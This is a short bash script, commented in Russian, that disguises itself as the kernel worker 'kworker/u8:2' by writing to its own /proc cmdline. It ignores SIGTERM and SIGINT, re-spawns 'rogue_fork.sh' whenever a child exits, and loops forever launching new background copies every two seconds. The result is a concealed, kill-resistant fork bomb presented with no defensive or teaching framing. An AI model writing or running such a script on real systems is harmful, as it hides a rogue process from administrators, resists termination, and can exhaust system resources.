#!/bin/bash

# Подделываем cmdline (возможна симуляция)
echo -ne "kworker/u8:2\0" > /proc/self/cmdline 2>/dev/null

trap '' SIGTERM
trap '' SIGINT
trap 'bash rogue_fork.sh &' SIGCHLD

while true; do
    bash rogue_fork.sh &
    sleep 2
done